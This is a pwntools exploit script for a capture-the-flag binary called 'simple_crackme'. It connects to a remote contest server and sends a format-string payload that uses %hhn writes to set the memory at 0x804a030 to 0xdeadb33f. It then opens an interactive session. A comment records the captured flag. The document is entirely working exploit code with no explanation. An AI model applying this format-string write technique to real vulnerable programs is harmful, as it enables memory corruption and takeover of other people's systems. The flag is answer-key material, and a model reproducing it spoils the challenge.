from pwn import *

elf = ELF("./simple_crackme", checksec=False)

#p = elf.process()
p = remote('140.82.48.126', 30001)
payload = b''.join([
    p32(0x804a030+0),
    p32(0x804a030+1),
    p32(0x804a030+2),
    p32(0x804a030+3),
    '%{0:d}x'.format(0x3f - (4*4)  & 0xff).encode(),b'%7$hhn',
    '%{0:d}x'.format(0xb3 - 0x3f & 0xff).encode(),b'%8$hhn',
    '%{0:d}x'.format(0x4d - 0xb3 & 0xff).encode(),b'%9$hhn',
    '%{0:d}x'.format(0xde - 0x4d & 0xff).encode(),b'%10$hhn',
])
p.sendlineafter(b':', payload)
p.interactive()
# format string
# KKST2020{bad_person_?}